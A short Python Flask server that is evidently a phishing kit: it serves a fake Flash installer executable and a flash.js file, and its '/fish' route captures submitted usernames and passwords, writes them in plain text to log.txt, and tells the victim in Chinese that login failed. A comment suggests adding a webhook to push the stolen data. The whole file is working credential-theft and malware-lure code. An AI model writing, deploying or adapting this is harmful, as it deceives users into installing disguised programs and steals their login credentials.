from flask import Flask, request, render_template, send_file
app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')
@app.route('/flashcenter_pp_ax_install_cn.sfx.exe', methods=['GET'])
def flashcenter_pp_ax_install_cn():
    return send_file('flashcenter_pp_ax_install_cn.sfx.exe', as_attachment=True)
@app.route('/flash.js', methods=['GET'])
def flash():
    return send_file('flash.js', as_attachment=True)

@app.route('/download', methods=['GET'])
def download_flash():
    return send_file('flashcenter_pp_ax_install_cn.exe', as_attachment=True)

@app.route('/fish', methods=['POST'])
def fish():
    username = request.form['username']
    password = request.form['password']
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(f'user:{username}, pass:{password}\n')
    # 这里可以加Webhook推送代码
    return "登录失败，请重试。"

if __name__ == '__main__':
    app.run(port=5000)